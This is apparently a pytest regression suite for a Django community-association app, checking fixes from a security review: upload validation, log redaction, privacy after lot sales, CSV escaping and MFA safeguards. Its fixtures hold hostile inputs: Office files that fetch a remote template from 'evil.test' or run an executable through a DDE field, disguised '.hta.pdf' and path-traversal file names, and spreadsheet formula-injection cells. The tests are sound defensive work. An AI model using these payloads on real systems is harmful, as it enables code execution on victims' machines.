"""Regression tests for the 2026-11 security review (docs/security-review-2026-11.md)."""

import io
import logging
import zipfile

import pytest
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import RequestFactory, override_settings

from accounts.tests.helpers import PASSWORD
from core.logging import JsonFormatter


def test_rate_limits_key_on_the_real_client_not_the_tunnel():
    """E1: behind cloudflared every request came from one address, so one client
    could exhaust allauth's per-IP limits for everyone."""
    from accounts.adapter import AccountAdapter

    factory = RequestFactory()
    with override_settings(TRUSTED_PROXY_CIDRS=["172.30.50.10/32"]):
        from core.net import TrustedProxyMiddleware

        seen = []
        middleware = TrustedProxyMiddleware(lambda r: seen.append(r) or None)
        for client in ("198.51.100.1", "198.51.100.2"):
            request = factory.get("/", REMOTE_ADDR="172.30.50.10", HTTP_CF_CONNECTING_IP=client)
            middleware(request)
    adapter = AccountAdapter()
    assert [adapter.get_client_ip(r) for r in seen] == ["198.51.100.1", "198.51.100.2"]


def test_logs_never_carry_token_urls():
    """D1/E2: Django's request logger passes the request, whose repr has the path."""
    request = RequestFactory().get("/invite/SECRET-TOKEN/?email=someone@example.org")
    record = logging.LogRecord(
        "django.request",
        logging.ERROR,
        __file__,
        1,
        "%s: %s",
        ("Internal Server Error", "/invite/SECRET-TOKEN/"),
        None,
    )
    record.request = request
    record.status_code = 500
    line = JsonFormatter().format(record)
    assert "SECRET-TOKEN" not in line
    assert "someone@example.org" not in line
    assert '"status_code": 500' in line


def test_oversized_request_is_refused_before_it_is_read(client, settings):
    """C4: the multipart parser used to buffer the whole body first."""
    settings.DOCUMENT_MAX_BYTES = 1000
    response = client.post(
        "/healthz",
        data=b"x",
        content_type="application/octet-stream",
        CONTENT_LENGTH=str(5 * 1024 * 1024),
    )
    assert response.status_code == 413


# --- Uploads ------------------------------------------------------------------


def _docx(extra: dict[str, bytes] | None = None, rels: bytes = b"") -> SimpleUploadedFile:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr("[Content_Types].xml", b"<Types/>")
        archive.writestr("word/document.xml", b"<w:document/>")
        archive.writestr(
            "word/_rels/settings.xml.rels",
            b'<Relationships xmlns="x">' + rels + b"</Relationships>",
        )
        for name, data in (extra or {}).items():
            archive.writestr(name, data)
    return SimpleUploadedFile("plan.docx", buffer.getvalue())


def test_plain_docx_is_accepted():
    from documents.validation import check_upload

    assert check_upload(_docx()).ext == "docx"


@pytest.mark.parametrize(
    "upload",
    [
        lambda: _docx(
            rels=b'<Relationship Id="r1" Type="http://x/attachedTemplate" '
            b'Target="https://evil.test/t.dotm" TargetMode="External"/>'
        ),
        lambda: _docx({"word/embeddings/oleObject1.bin": b"x"}),
        lambda: _docx({"word/activeX/activeX1.xml": b"x"}),
    ],
    ids=["remote-template", "ole-embedding", "activex"],
)
def test_office_files_that_can_run_or_fetch_code_are_refused(upload):
    """C3."""
    from documents.validation import UploadRejected, check_upload

    with pytest.raises(UploadRejected):
        check_upload(upload())


def test_text_is_checked_beyond_the_first_8kb():
    from documents.validation import UploadRejected, check_upload

    ok = "é".join(["a" * 4095] * 4).encode()  # multibyte characters across 8192
    assert check_upload(SimpleUploadedFile("notes.txt", ok)).ext == "txt"
    with pytest.raises(UploadRejected):
        check_upload(SimpleUploadedFile("notes.txt", b"a" * 9000 + b"\x00"))


@pytest.mark.parametrize(
    "name",
    [
        "Site_plan" + "_" * 137 + ".hta" + "x" * 40 + ".pdf",
        "evil.hta.pdf",
        "..\\..\\x.exe.pdf",
        "a" * 400 + ".pdf",
    ],
)
def test_stored_names_always_end_in_the_validated_extension(name):
    """C1: cutting a long name to 150 characters could leave it ending in .hta."""
    from documents.validation import safe_filename

    result = safe_filename(name, "pdf")
    assert result.endswith(".pdf")
    assert result.count(".") == 1
    assert len(result) <= 125


def test_attachments_obey_require_clean_scan(settings):
    """C2: attachments ignored DOCUMENT_REQUIRE_CLEAN_SCAN."""
    from documents.services import scan_allows_download

    settings.DOCUMENT_REQUIRE_CLEAN_SCAN = True
    assert scan_allows_download("unscanned") is False
    assert scan_allows_download("clean") is True
    settings.DOCUMENT_REQUIRE_CLEAN_SCAN = False
    assert scan_allows_download("unscanned") is True
    assert scan_allows_download("infected") is False


# --- Ownership transfer privacy (A4, A7) ----------------------------------------


@pytest.fixture
def sold_lot(db):
    from datetime import timedelta

    from django.utils import timezone

    from arc import services as arc
    from arc.models import ArcRequest
    from community import services as community
    from community.models import Person
    from community.tests.factories import LotFactory, make_member
    from compliance import services as compliance
    from compliance.models import Violation
    from core.policy import SYSTEM
    from core.scoping import system_access

    lot = LotFactory()
    board = make_member(board=True)
    seller = make_member(lots=[lot])
    old_arc = arc.create_request(lot=lot, title="Seller's deck", description="x", actor=seller)
    resolved = compliance.report(lot=lot, category="trash", description="bins", actor=board)
    compliance.VIOLATION.apply(resolved, "send_notice", actor=board)
    compliance.respond(resolved, text="SELLER-PRIVATE-REPLY", actor=seller)
    unresolved = compliance.report(lot=lot, category="trash", description="weeds", actor=board)
    compliance.VIOLATION.apply(unresolved, "send_notice", actor=board)
    a_month_ago = timezone.now() - timedelta(days=30)
    with system_access("t"):
        ArcRequest.objects.filter(pk=old_arc.pk).update(created_at=a_month_ago)
        Violation.objects.filter(pk__in=[resolved.pk, unresolved.pk]).update(created_at=a_month_ago)
        Violation.objects.filter(pk=resolved.pk).update(state="closed")
    draft = compliance.report(lot=lot, category="trash", description="draft", actor=board)
    buyer = make_member()
    with system_access("t"):
        buyer_person = Person.objects.get(user=buyer)
    community.transfer_lot(
        lot, new_owners=[buyer_person], transfer_date=timezone.localdate(), actor=SYSTEM
    )
    return {
        "lot": lot,
        "seller": seller,
        "buyer": buyer,
        "board": board,
        "old_arc": old_arc,
        "resolved": resolved,
        "unresolved": unresolved,
        "draft": draft,
    }


def test_buyer_cannot_see_sellers_arc_requests_or_closed_notices(sold_lot, client):
    from django.urls import reverse

    client.force_login(sold_lot["buyer"])
    assert client.get(reverse("arc_detail", args=[sold_lot["old_arc"].pk])).status_code == 404
    assert (
        client.get(reverse("violation_detail", args=[sold_lot["resolved"].pk])).status_code == 404
    )


def test_buyer_sees_unresolved_notice_but_not_the_sellers_reply(sold_lot, client):
    from django.urls import reverse

    client.force_login(sold_lot["buyer"])
    response = client.get(reverse("violation_detail", args=[sold_lot["unresolved"].pk]))
    assert response.status_code == 200
    assert b"SELLER-PRIVATE-REPLY" not in response.content
    assert sold_lot["board"].email.encode() not in response.content  # role, not email


def test_owner_never_sees_a_violation_before_notice(sold_lot, client):
    from django.urls import reverse

    client.force_login(sold_lot["buyer"])
    assert client.get(reverse("violation_detail", args=[sold_lot["draft"].pk])).status_code == 404


def test_board_still_sees_the_whole_history(sold_lot, client):
    from django.urls import reverse

    client.force_login(sold_lot["board"])
    assert client.get(reverse("arc_detail", args=[sold_lot["old_arc"].pk])).status_code == 200
    page = client.get(reverse("violation_detail", args=[sold_lot["resolved"].pk]))
    assert b"SELLER-PRIVATE-REPLY" in page.content


@pytest.mark.parametrize(
    "value,expected",
    [
        (" =HYPERLINK(1)", "' =HYPERLINK(1)"),
        ("\n=1+1", "'\n=1+1"),
        (chr(0xFF1D) + "1", "'" + chr(0xFF1D) + "1"),  # full-width equals
        ("=SUM(A1)", "'=SUM(A1)"),
        ("@x", "'@x"),
        ("-12.50", "-12.50"),
        ("$1,000", "$1,000"),
        ("Plain", "Plain"),
    ],
)
def test_csv_cells_cannot_start_a_formula(value, expected):
    """C5: leading whitespace and full-width signs got past the old check."""
    from reports.views import _safe_cell

    assert _safe_cell(value) == expected


def test_titles_are_single_line_for_email_subjects():
    """C6: a newline in an announcement title made every send fail."""
    from core.text import single_line

    assert single_line("Pond\nclosed" + chr(0x2028) + "today\x0b!") == "Pond closed today !"


def test_permissions_policy_header(client):
    assert "camera=()" in client.get("/healthz")["Permissions-Policy"]


# --- Re-audit of the fixes (second iteration) -------------------------------------


def test_the_last_authenticator_cannot_be_removed(db):
    """R1: removing it would lock the owner out until a two-member reset."""
    from allauth.mfa.adapter import get_adapter
    from allauth.mfa.models import Authenticator

    from community.tests.factories import LotFactory, make_member

    user = make_member(lots=[LotFactory()])
    only = Authenticator.objects.get(user=user, type=Authenticator.Type.TOTP)
    assert get_adapter().can_delete_authenticator(only) is False
    Authenticator.objects.create(user=user, type=Authenticator.Type.WEBAUTHN, data={})
    assert get_adapter().can_delete_authenticator(only) is True


def test_the_only_passkey_cannot_be_removed_through_the_page(client, db):
    """SEC-004: allauth's passkey removal did not ask the adapter."""
    from allauth.mfa.models import Authenticator
    from django.urls import reverse
    from django.utils import timezone

    from community.tests.factories import LotFactory, make_member

    user = make_member(lots=[LotFactory()], mfa=False)
    passkey = Authenticator.objects.create(
        user=user, type=Authenticator.Type.WEBAUTHN, data={"name": "Phone"}
    )
    client.force_login(user)
    session = client.session
    session["account_authentication_methods_user"] = str(user.pk)
    session["account_authentication_methods"] = [
        {"method": "password", "at": timezone.now().timestamp(), "reauthenticated": True}
    ]
    session.save()
    remove = reverse("mfa_remove_webauthn", args=[passkey.pk])
    page = client.get(reverse("mfa_list_webauthn")).content.decode()
    assert remove not in page and "cannot be removed" in page
    response = client.post(remove)
    assert response.status_code == 302
    assert Authenticator.objects.filter(pk=passkey.pk).exists()
    # With a second passkey either one can go.
    Authenticator.objects.create(
        user=user, type=Authenticator.Type.WEBAUTHN, data={"name": "Laptop"}
    )
    assert remove in client.get(reverse("mfa_list_webauthn")).content.decode()
    client.post(remove)
    assert not Authenticator.objects.filter(pk=passkey.pk).exists()


def test_the_only_authenticator_app_shows_no_turn_off(client, db):
    """SEC-004: no Remove or Turn off on the last strong authenticator."""
    from allauth.mfa.models import Authenticator
    from django.urls import reverse

    from community.tests.factories import LotFactory, make_member

    user = make_member(lots=[LotFactory()])  # an authenticator app only
    client.force_login(user)
    turn_off = reverse("mfa_deactivate_totp")
    page = client.get(reverse("mfa_index")).content.decode()
    assert "Sign-in and security" in page and turn_off not in page
    Authenticator.objects.create(user=user, type=Authenticator.Type.WEBAUTHN, data={"name": "x"})
    assert turn_off in client.get(reverse("mfa_index")).content.decode()


def test_break_glass_enrollment_code_only_when_the_board_cannot_reset(db):
    """R2: the first officer who missed the setup window had no way back."""
    import io

    from django.core.management import call_command
    from django.core.management.base import CommandError

    from community.models import Role
    from community.tests.factories import make_member
    from core.policy import SYSTEM  # noqa: F401

    officer = make_member(board=True, roles=[Role.SYSADMIN], mfa=False)
    out = io.StringIO()
    call_command(
        "breakglass_enrollment_code",
        user=officer.pk,
        actor=officer.email,
        reason="first officer missed the setup window",
        stdout=out,
    )
    assert "-" in out.getvalue().splitlines()[-1]  # the code, e.g. ABCD-EFGH-JKLM
    make_member(board=True)
    make_member(board=True)
    other = make_member(board=True, mfa=False)
    with pytest.raises(CommandError, match="assisted reset"):
        call_command(
            "breakglass_enrollment_code",
            user=other.pk,
            actor=officer.email,
            reason="should use the assisted reset now",
        )


def test_re_recorded_ownership_keeps_the_owners_history(db):
    """R3: adding a spouse restarted the ownership and hid the owner's records."""
    from datetime import timedelta

    from django.utils import timezone

    from community import services
    from community.models import Person
    from community.tests.factories import LotFactory, PersonFactory, make_member
    from core import policy
    from core.policy import SYSTEM
    from core.scoping import system_access

    lot = LotFactory()
    owner = make_member(lots=[lot])  # ownership started 300 days ago
    with system_access("t"):
        person = Person.objects.get(user=owner)
    services.transfer_lot(
        lot, new_owners=[person, PersonFactory()], transfer_date=timezone.localdate(), actor=SYSTEM
    )
    since = dict(policy.roles_for(owner).owned_since)[lot.pk]
    assert since <= timezone.localdate() - timedelta(days=299)


def test_violation_dismissed_before_notice_stays_internal(db):
    """R5."""
    from community.tests.factories import LotFactory, make_member
    from compliance import services
    from compliance.models import Violation

    lot = LotFactory()
    board, owner = make_member(board=True), make_member(lots=[lot])
    v = services.report(lot=lot, category="trash", description="tip-off", actor=board)
    services.VIOLATION.apply(v, "dismiss", actor=board, note="Not a violation")
    assert not Violation.objects.for_user(owner).exists()


def test_seller_loses_their_arc_request_after_selling(db):
    """R6: the applicant clause ignored ownership."""
    from django.utils import timezone

    from arc import services as arc
    from arc.models import ArcRequest
    from community import services
    from community.tests.factories import LotFactory, PersonFactory, make_member
    from core.policy import SYSTEM

    sold, kept = LotFactory(), LotFactory()
    seller = make_member(lots=[sold, kept])
    req = arc.create_request(lot=sold, title="Deck", description="x", actor=seller)
    services.transfer_lot(
        sold, new_owners=[PersonFactory()], transfer_date=timezone.localdate(), actor=SYSTEM
    )
    assert not ArcRequest.objects.for_user(seller).filter(pk=req.pk).exists()


@pytest.mark.parametrize(
    "extra,rels",
    [
        (
            {},
            b"<Relationship Id='r1' Type='http://x/attachedTemplate' "
            b"Target='https://evil.test/t.dotm' TargetMode='External'/>",
        ),
        (
            {},
            b'<Relationship Id="r2" Type="http://x/image" Target="file://host/share/a.png" '
            b'TargetMode="External"/>',
        ),
        ({"word/footer1.xml": b'<w:fldSimple w:instr=" DDEAUTO c:\\\\x.exe "/>'}, b""),
        ({"xl/externalLinks/externalLink1.xml": b"<x/>"}, b""),
    ],
    ids=["single-quoted-template", "external-image", "dde-field", "excel-external-link"],
)
def test_office_bypasses_found_on_re_audit_are_refused(extra, rels):
    """R4."""
    from documents.validation import UploadRejected, check_upload

    with pytest.raises(UploadRejected):
        check_upload(_docx(extra, rels))


def test_external_hyperlinks_are_still_allowed():
    from documents.validation import check_upload

    rels = (
        b'<Relationship Id="r3" Type="http://x/hyperlink" '
        b'Target="https://example.org" TargetMode="External"/>'
    )
    assert check_upload(_docx(rels=rels)).ext == "docx"


def test_owners_cannot_pile_up_draft_arc_requests(db):
    """R7: each draft could hold 40 permanent files."""
    from arc import services as arc
    from community.tests.factories import LotFactory, make_member

    lot = LotFactory()
    owner = make_member(lots=[lot])
    for i in range(arc.MAX_OPEN_DRAFTS):
        arc.create_request(lot=lot, title=f"Idea {i}", description="x", actor=owner)
    with pytest.raises(arc.ArcError, match="draft"):
        arc.create_request(lot=lot, title="One too many", description="x", actor=owner)


def test_invitation_for_another_address_cannot_be_accepted_or_resent(db):
    """R9: invitations created before the fix with a different address."""
    from accounts import services
    from accounts.models import Invitation
    from community.tests.factories import PersonFactory, make_member
    from core.scoping import system_access

    board = make_member(board=True)
    invitation = services.create_invitation(
        person=PersonFactory(email="owner@example.org"), actor=board, send_email=False
    )
    with system_access("t"):
        Invitation.objects.filter(pk=invitation.pk).update(email="attacker@example.net")
    invitation.refresh_from_db()
    with pytest.raises(services.InvitationError):
        services.resend_invitation(invitation, actor=board)
    with pytest.raises(services.InvitationError):
        services.accept_invitation(invitation, password=PASSWORD)
